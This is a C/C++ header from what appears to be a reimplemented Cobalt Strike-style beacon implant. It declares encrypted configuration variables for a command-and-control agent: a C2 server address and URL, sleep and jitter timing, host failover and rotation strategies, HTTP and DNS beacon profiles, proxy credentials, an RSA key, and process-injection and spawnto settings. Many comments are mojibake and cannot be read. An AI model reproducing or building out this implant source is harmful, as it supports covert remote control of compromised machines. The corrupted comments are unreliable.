/**
* Created by ???.
* @Author : Galaxy
* @create rebeacon
*/
//�����
#include <windows.h>
struct shark_unsignedstring{
    unsigned char* value;
    int flag = 0;
};
struct shark_string{
    char* value;
    int flag = 0;
};
struct shark_int{
    int value;
    int flag = 0;
};
struct shark_WORD{
    WORD value;
    int flag = 0;
};
struct shark_DWORD{
    DWORD value;
    int flag = 0;
};

//�����
extern int shark_paths_size;
extern char* shark_path[];
//1
extern shark_int shark_flaghttpopen;

//8  8:   192.168.159.128,/j.ad
extern shark_string shark_serverip;
extern shark_string shark_ServerGetUrl;
//2
extern shark_int shark_ServerPort;


//10 ��sharkinit�г�ʼ��λ���path
extern shark_string shark_ServerPostUrl;
//3
extern shark_int shark_dwMilliseconds;
//5
extern shark_int shark_jitter;

//67 ��ģʽid
//2��ʾrotate��failover
//�����random����1 ���ģʽ
//�����round-robin����0 Ĭ��ģʽ
extern shark_int shark_strategyID;
//69 ��failover(�����л�)�й� ��failoverģʽ 69����0
//���ǰ��մ�������л���ʱ��69����ָ������
extern shark_int shark_failover_Strategy_number;
//70Ҳ��failover�йص��ǰ���ʱ���л���ʱ��70����ָ����ʱ��
extern shark_int shark_failover_Strategy_time;
//68 �����rotateģʽ ���л�ʱ���й�
extern shark_int shark_rotate_Strategy_time;

//9
extern shark_string shark_lpszAgent;

//43 Ȩ��
extern shark_int shark_bofrwx;
//44
extern shark_int shark_userwx;
//30
extern shark_string shark_post_ex_spawnto_x64;
//29
extern shark_string shark_post_ex_spawnto_x86;
//45 .process-inject.min_alloc
extern shark_int shark_min_alloc;

//51
extern shark_string shark_process_inject_execute;
// 47  .process-inject.transform-x64   256 bytes
extern shark_string shark_process_inject_transform_x64;
// 46
extern shark_string shark_process_inject_transform_x32;
//41
extern shark_int shark_BeaconCode;
//40 stop_data
extern shark_int shark_kill_data;
//54
extern shark_string shark_httpHeaderHost;
//12
extern shark_string shark_http_get_client_config;
//26 get or post
extern shark_string shark_verb;
//11   .http-get.server.output
extern shark_string shark_server_output_config;
//13 .http-post.client
extern shark_string shark_http_post_client_config;
//27 verb ָ�������������ʹ�õ� HTTP ν�ʵ� �� null ��β���ַ�����ָ�롣 ����˲���Ϊ NULL������ʹ�� GET ��Ϊ HTTP ν�ʡ�
extern shark_string shark_http_verb;
//28 �ֿ��־
extern shark_int shark_shouldChunkPosts;

//DNS ����

//20 dns sleep  .dns-beacon.dns_sleep
extern shark_DWORD shark_dns_sleep;
//19 dns_idle   .dns-beacon.dns_idle
extern shark_DWORD shark_dns_idle;
//61 dns_get_A  .dns-beacon.get_A
extern shark_string shark_dns_get_A;
//62  dns_get_AAAA  .dns-beacon.get_AAAA
extern shark_string shark_dns_get_AAAA;
//63  dns_get_TXT .dns-beacon.get_TXT
extern shark_string shark_dns_get_TXT;
//66   dns������������ѡ��dnsresolver
extern shark_string shark_dns_Listeneroptions_dnsresolver;


//35 �ж��Ƿ���Ҫ����http����
extern shark_int shark_Proxyset;
//ProxyStrBuffer = get_str(32);
extern shark_string shark_ProxyStrBuffer;

//33  username_str proxy�����û���
extern shark_string username_str;
//34  password_str proxy��������
extern shark_string password_str;

//59  headerͷ
extern shark_string shark_lpszHeaders;


//31
extern shark_WORD shark_CryptoScheme;
//7  ��ȡRSA��Կ
extern shark_string shark_rsa_publickey;


unsigned char* decryptunsignedString(shark_unsignedstring var1);
//58 57 Ϊ��beacon��header


//39 BeaconCreateBackgroundThreads
extern shark_int shark_CreateBackgroundThreads;

//55
extern shark_int shark_exitflag;
//52
extern shark_int shark_virtualalloc;
//50
extern shark_int shark_usesCookieBeacon;
//42
extern shark_string shark_sleepsection;

//58
extern shark_string shark_58tcp;
//57
extern shark_string shark_57smb;
//102
extern shark_int shark_posturllength;
//103
extern shark_int shark_geturllength;

DWORD decryptDWORD(shark_DWORD var1);
WORD decryptWORD(shark_WORD var1);
char* decryptString(shark_string var1);
int decryptInt(shark_int var1);

void initGlobleVar();


